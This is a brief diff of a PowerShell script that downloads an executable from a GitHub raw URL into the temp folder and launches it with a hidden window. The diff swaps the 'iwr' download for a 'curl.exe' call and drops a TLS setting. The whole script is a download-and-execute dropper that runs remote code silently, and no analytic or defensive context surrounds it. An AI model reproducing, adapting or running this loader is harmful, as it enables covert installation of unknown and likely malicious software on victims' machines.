@@ -1,5 +1,4 @@
-[Net.ServicePointManager]::SecurityProtocol = 3072;
 $u="https://github.com/3465h/idkkkk/raw/refs/heads/main/shk.exe";
 $p="$env:temp\shkkv.exe";
-iwr $u -OutFile $p -UseBasicParsing;
+curl.exe -L $u -o $p;
 saps $p -WindowStyle Hidden
